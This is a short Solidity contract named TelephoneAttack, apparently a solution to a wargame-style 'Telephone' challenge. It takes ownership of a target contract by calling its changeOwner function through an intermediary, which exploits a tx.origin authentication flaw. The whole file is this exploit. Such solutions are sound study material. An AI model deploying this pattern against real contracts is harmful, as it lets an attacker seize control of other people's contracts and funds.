// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}
contract TelephoneAttack {

  ITelephone telephoneContract;

  constructor(address _telephoneAddr) public {
    require(_telephoneAddr != address(0));
    telephoneContract = ITelephone(_telephoneAddr);
  }
  function attack() public {
    telephoneContract.changeOwner(msg.sender);
  }
}